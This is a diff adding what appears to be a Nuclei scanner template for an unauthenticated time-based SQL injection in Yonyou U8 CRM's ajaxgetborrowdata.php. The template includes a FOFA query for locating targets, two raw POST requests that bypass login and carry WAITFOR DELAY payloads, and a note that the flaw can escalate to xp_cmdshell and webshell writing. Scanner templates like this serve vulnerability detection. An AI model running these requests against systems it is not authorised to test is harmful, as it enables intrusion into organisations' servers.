@@ -1,0 +1,38 @@
+id: yongyouU8-CRM-ajaxgetborrowdata_php-sql-time-3
+
+info:
+  name: 用友U8 CRM ajaxgetborrowdata.php 多方法SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="用友U8CRM"
+      用友U8 CRM客户关系管理系统在/borrowout/ajaxgetborrowdata.php处理程序的多个方法实现中存在SQL注入缺陷。攻击者可通过构造恶意SQL查询参数突破输入验证机制，利用xp_cmdshell扩展存储过程执行系统命令注入，实现Webshell文件写入及服务器控制权限获取。该漏洞允许未经身份验证的远程攻击者直接操作数据库并扩展至操作系统层面，存在严重安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/PvvWqzbYEuZ6ud2bDYrnng?token=974751616&lang=zh_CN
+  tags: 用友
+
+
+http:
+- raw:
+  - |
+    POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusPrice HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    i=-99%27%3BWAITFOR+DELAY+%270%3A0%3A4%27--
+  - |
+    POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusPrice HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    i=-99%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
